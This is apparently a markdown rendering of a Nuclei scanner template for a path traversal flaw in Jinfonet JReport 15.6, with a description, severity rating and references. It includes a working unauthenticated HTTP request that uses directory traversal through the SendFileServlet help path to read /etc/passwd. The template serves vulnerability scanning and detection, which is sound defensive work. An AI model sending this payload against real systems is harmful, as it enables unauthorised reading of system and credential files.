# Nuclei Template: Jinfornet Jreport 15.6 - Local File Inclusion
**Template ID:** jinfornet-jreport-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`jinfornet-jreport-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Jinfornet Jreport 15.6 is vulnerable to local file incluion via the Jreport Help function in the SendFileServlet. Exploitaiton allows remote unauthenticated users to view any files on the Operating System with Application services user permission. This vulnerability affects Windows and Unix operating systems.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2020030151
- https://www.jinfonet.com/product/download-jreport/
